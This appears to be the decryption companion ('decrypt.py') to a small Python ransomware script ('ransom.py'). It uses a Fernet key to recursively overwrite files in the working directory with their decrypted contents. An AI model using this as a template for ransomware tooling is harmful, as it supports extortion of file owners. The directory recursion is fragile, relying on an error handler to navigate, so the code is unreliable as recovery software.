from cryptography.fernet import Fernet
import os

def files_list():
    allfiles = os.listdir(".")
    files = []
    for i in allfiles:
        if i == 'ransom.py' or i == 'decrypt.py' or i == 'filekey.key':
            pass
        else:
            files.append(i)
    return files

files = files_list()

with open('filekey.key', 'rb') as keyfile:
    key = keyfile.read()

fernet = Fernet(key)

def decrypt(files):
    for file in files:
        try:
            if os.path.isfile(file):
                with open(file,'rb') as targetfile:
                    data = targetfile.read()
                data = fernet.decrypt(data)
                with open(file, 'wb') as targetfile:
                    targetfile.write(data)
            else:
                os.chdir(file)
                newfiles = files_list()
                decrypt(newfiles)
        except FileNotFoundError:
            decryptedfile = os.path.basename(os.getcwd())
            os.chdir("..")
            newfiles = files_list()
            newfiles.remove(decryptedfile)
            decrypt(newfiles)

decrypt(files)